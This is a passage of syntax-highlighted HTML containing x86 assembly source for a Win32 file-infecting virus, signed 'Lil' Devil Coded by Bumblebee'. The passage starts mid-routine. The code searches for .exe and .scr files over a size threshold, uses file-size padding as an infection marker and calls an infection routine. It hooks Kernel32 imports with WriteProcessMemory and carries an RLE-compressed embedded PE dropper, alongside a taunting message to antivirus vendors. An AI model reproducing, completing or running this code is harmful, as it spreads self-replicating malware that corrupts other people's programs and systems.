        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lowerDDSTACK</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'exe.'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">validFileExt</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'rcs.'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skipThisFile</span><span class="sc0">

</span><span class="sc5">validFileExt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">find_data.nFileSizeLow</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8000h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">skipThisFile</span><span class="sc0">                    </span><span class="sc1">; at least 8000h bytes?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">PADDING</span><span class="sc0">                     </span><span class="sc1">; test if it's infected</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; yet</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; reminder is zero?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">skipThisFile</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">find_data.cFileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">
</span><span class="sc1">;       @debug  "Infectable file",esi           ; debug code</span><span class="sc0">

</span><span class="sc5">skipThisFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">find_data</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">findHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_FindNextFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Find next file</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">findNext</span><span class="sc0">

</span><span class="sc5">infectionDone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">findHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_FindClose</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">notFound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; API hook routine.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; in:</span><span class="sc0">
</span><span class="sc1">;       eax     addr of loaded module</span><span class="sc0">
</span><span class="sc1">;       ecx     addr of API to hook</span><span class="sc0">
</span><span class="sc1">;       esi     addr of hook routine</span><span class="sc0">
</span><span class="sc1">; out:</span><span class="sc0">
</span><span class="sc1">;       eax     0 on error</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">APIHook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; begin PE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; RVA import</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; uh? no imports??? :)</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">skipHookErr</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; add base addr</span><span class="sc0">
</span><span class="sc5">searchK32Imp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get name</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; check is not last</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">skipHookErr</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; add base addr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lowerDDSTACK</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc12">'nrek'</span><span class="sc0">                      </span><span class="sc1">; look for Kernel32 module</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nextName</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lowerDDSTACK</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc12">'23le'</span><span class="sc0">                      </span><span class="sc1">; kernel32 found</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">k32ImpFound</span><span class="sc0">
</span><span class="sc5">nextName</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">; if not found check</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">                         </span><span class="sc1">; name of next import</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; module</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">skipHookErr</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">searchK32Imp</span><span class="sc0">
</span><span class="sc5">k32ImpFound</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; now we have k32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get address table</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; heh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">skipHookErr</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; add base addr again</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; search for API</span><span class="sc0">
</span><span class="sc5">nextImp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; get addrs</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; chek is not last</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">skipHookErr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; cmp with API addr</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">doHook</span><span class="sc0">                          </span><span class="sc1">; found? hook!</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nextImp</span><span class="sc0">                         </span><span class="sc1">; check next in table</span><span class="sc0">
</span><span class="sc5">doHook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; save import addr</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetCurrentProcess</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; tmp storage</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">fileAttrib</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; tmp storage for shit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">fileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; bytes to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; where to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; current process</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_WriteProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">skipHook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">skipHookErr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; in:  esi from</span><span class="sc0">
</span><span class="sc1">;      edi to</span><span class="sc0">
</span><span class="sc1">; out: ebx added moved bytes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; My lstrcpy :) (it doesn't copy the zero)</span><span class="sc0">
</span><span class="sc1">; You can use lstrcat... but i like it counts the relative bytes moved...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mlstrcpy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">mlstrcpyloop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">mlstrcpyout</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mlstrcpyloop</span><span class="sc0">
</span><span class="sc5">mlstrcpyout</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; push  dword ptr [val]  ; 'eg.A'</span><span class="sc0">
</span><span class="sc1">; call  lowerDDSTACK</span><span class="sc0">
</span><span class="sc1">; pop   dword ptr [val]  ; 'eg.a'</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Changes val to lower case</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">lowerDDSTACK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">lowerDDSTACKLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">nextByte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">nextByte</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; this makes lower case only if</span><span class="sc0">
</span><span class="sc5">nextByte</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">; it is upper case ;)</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">lowerDDSTACKLoop</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; some messages</span><span class="sc0">
</span><span class="sc5">copyright</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'&lt; Lil'' Devil Coded by Bumblebee &gt;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc5">mess4Avers</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Come on little devil, be my little Angel...'</span><span class="sc0">

</span><span class="sc1">; Generated RLE compressed data</span><span class="sc0">
</span><span class="sc5">drop</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">04dh</span><span class="sc4">,</span><span class="sc2">05ah</span><span class="sc4">,</span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">011h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">0a3h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">02ch</span><span class="sc4">,</span><span class="sc2">00eh</span><span class="sc4">,</span><span class="sc2">01fh</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">00eh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">06dh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">071h</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc2">03ah</span><span class="sc4">,</span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">00bh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">08fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">08ch</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">085h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">0ach</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">00ch</span><span class="sc4">,</span><span class="sc2">0d3h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">078h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc0">
